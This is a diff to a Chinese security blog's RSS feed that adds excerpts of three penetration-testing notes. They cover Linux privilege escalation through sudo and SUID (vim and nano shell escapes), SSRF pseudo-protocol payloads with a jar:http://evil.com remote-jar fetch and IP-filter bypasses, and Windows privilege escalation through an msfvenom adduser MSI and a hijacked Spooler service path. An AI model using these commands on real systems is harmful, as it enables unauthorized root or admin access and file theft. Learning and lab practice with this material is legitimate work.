@@ -6,8 +6,206 @@
     <description>Recent content in Posts on H4ck3r Station</description>
     <generator>Hugo -- 0.155.1</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sat, 07 Feb 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sun, 15 Feb 2026 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Linux提权</title>
+      <link>http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/</link>
+      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/</guid>
+      <description>&lt;h1 id=&#34;常规提权方式&#34;&gt;常规提权方式&lt;/h1&gt;
+&lt;h2 id=&#34;一sudo滥用提权&#34;&gt;一、sudo滥用提权&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;提示要输入密码的原因:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;默认SUDO行为 : 需要输入当前用户的密码(不是root)密码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;sudoers配置问题: 未配置免密码访问 在&lt;code&gt;/etc/sudoers&lt;/code&gt;文件中没有为当前用户配置&lt;code&gt;NOPASSWD&lt;/code&gt;选项&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;检查当前用户所在组&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id username 	
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;如果发现在wheel组中,检查wheel组的配置&lt;/p&gt;
+&lt;p&gt;查看&lt;code&gt;%wheel&lt;/code&gt;相关配置,看是否设置了&lt;code&gt;NOPASSWD&lt;/code&gt;或要求密码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo visudo
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;从wheel组中移除用户&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo gpasswd -d username wheel
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;利用步骤&#34;&gt;利用步骤：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;查看当前用户sudo权限&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;示例输出：&lt;code&gt;(ALL) NOPASSWD: /usr/bin/vim&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用vim提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/vim
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;在vim中输入 &lt;code&gt;:set shell=/bin/bash&lt;/code&gt; 回车&lt;/li&gt;
+&lt;li&gt;然后输入 &lt;code&gt;:shell&lt;/code&gt; 回车&lt;/li&gt;
+&lt;li&gt;成功获得root shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用其他命令提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;如果发现可以执行&lt;code&gt;/usr/bin/nano&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/nano
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;在nano中按&lt;code&gt;Ctrl+R&lt;/code&gt;，输入&lt;code&gt;!bash&lt;/code&gt;，回车&lt;/li&gt;
+&lt;li&gt;即可获得root shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;说明&#34;&gt;说明：&lt;/h3&gt;
+&lt;p&gt;sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。&lt;/p&gt;
+&lt;h2 id=&#34;二suid特殊权限提权&#34;&gt;二、SUID特殊权限提权&lt;/h2&gt;
+&lt;h3 id=&#34;利用步骤-1&#34;&gt;利用步骤：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;查找SUID文件&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find / -perm -u&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;s -type f 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用/bin/mount提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir /tmp/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;touch /tmp/mount/malicious_file
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /bin/mount -o bind /tmp/mount /tmp/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /bin/mount /tmp/mount /tmp/mount
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;通过此方式可获取root权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用/bin/ping提权&lt;/strong&gt;：&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>SSRF</title>
+      <link>http://localhost:1313/posts/ssrf/</link>
+      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/ssrf/</guid>
+      <description>&lt;h3 id=&#34;伪协议&#34;&gt;伪协议&lt;/h3&gt;
+&lt;h5 id=&#34;php&#34;&gt;PHP&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;http/s://  &lt;/code&gt;常用于探测存活主机和开放端口,配合burp&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://example.com/title?title=http://127.0.0.1:6379
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;file:// &lt;/code&gt; 读取文件内容&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file:///etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;dict://  &lt;/code&gt;字典服务协议，可以通过这个协议执行一些指令.但是&lt;code&gt;dict&lt;/code&gt;很难完成复杂的认证，他每次发送的请求都是新建立的连接&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dict://127.0.0.1:6379/info
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;gopher:// &lt;/code&gt; gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gopher://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/_&amp;lt;payload&amp;gt;
+
+_ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符
+&amp;lt;payload&amp;gt; : 经过URL编码的原始tcp数据流
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;java&#34;&gt;JAVA&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;file://&lt;/code&gt; 协议	与 PHP 类似&lt;/p&gt;
+&lt;p&gt;可以读取本地文件：&lt;code&gt;file:///etc/passwd&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;netdoc://&lt;/code&gt; 协议	它允许你访问并提取 &lt;code&gt;jar&lt;/code&gt; 包中的内容。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Payload: &lt;code&gt;netdoc:///etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;jar://&lt;/code&gt; 协议	它允许你访问并提取 &lt;code&gt;jar&lt;/code&gt; 包中的内容。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;语法： &lt;code&gt;jar:{url}!/{entry}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;用法： &lt;code&gt;jar:http://evil.com/test.jar!/com/test/Main.class&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;利用点：
+&lt;ol&gt;
+&lt;li&gt;让服务器去下载远程恶意 jar 包。&lt;/li&gt;
+&lt;li&gt;读取本地 classpath 下的配置文件。&lt;/li&gt;
+&lt;li&gt;结合某些反序列化漏洞，控制类加载过程。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;绕过&#34;&gt;绕过&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;IP地址&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;进制转换： 浏览器和许多网络库支持非十进制的 IP。
+
+八进制： 0177.0.0.1
+十六进制： 0x7f.0x0.0x0.0x1
+十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&amp;gt; 2130706433
+
+特殊省略写法：
+
+127.0.0.1 可以写成 127.1 或 127.0.1。
+0.0.0.0 在 Linux 下通常也会指向本地。
+
+IPv6 绕过：
+使用 [::1] 代表 127.0.0.1。
+使用 IPv6 格式的内网地址。
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;利用DNS&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Windows提权</title>
+      <link>http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/</link>
+      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/</guid>
+      <description>&lt;h1 id=&#34;windows工作组环境和域环境提权方式详解&#34;&gt;Windows工作组环境和域环境提权方式详解&lt;/h1&gt;
+&lt;h2 id=&#34;一工作组环境提权方式&#34;&gt;一、工作组环境提权方式&lt;/h2&gt;
+&lt;h3 id=&#34;1-alwaysinstallelevated提权&#34;&gt;1. AlwaysInstallElevated提权&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;系统已启用AlwaysInstallElevated（注册表值为1）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;检查方法&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用步骤&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;生成恶意MSI文件（在Kali Linux中）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;如果在Windows上操作，可以使用在线工具生成MSI文件&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在Windows上执行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msiexec /i add.msi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;验证提权：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net user hacker
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;成功标志&lt;/strong&gt;：看到hacker账户，且在管理员组中&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;2-服务权限配置错误提权&#34;&gt;2. 服务权限配置错误提权&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;服务路径权限配置错误&lt;/li&gt;
+&lt;li&gt;当前用户对服务可执行文件或目录有写权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;检查方法&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc query
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;winpeas.exe quiet notcolor serviceinfo
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用步骤&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;找到一个服务（如Spooler）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc qc Spooler
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改服务路径：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&amp;#34;&lt;/span&gt; /t REG_EXPAND_SZ /v ImagePath /d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil\shell.exe&amp;#34;&lt;/span&gt; /f
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;重启服务：&lt;/p&gt;</description>
+    </item>
     <item>
       <title>PHP反序列化</title>
       <link>http://localhost:1313/posts/php_serialize/</link>
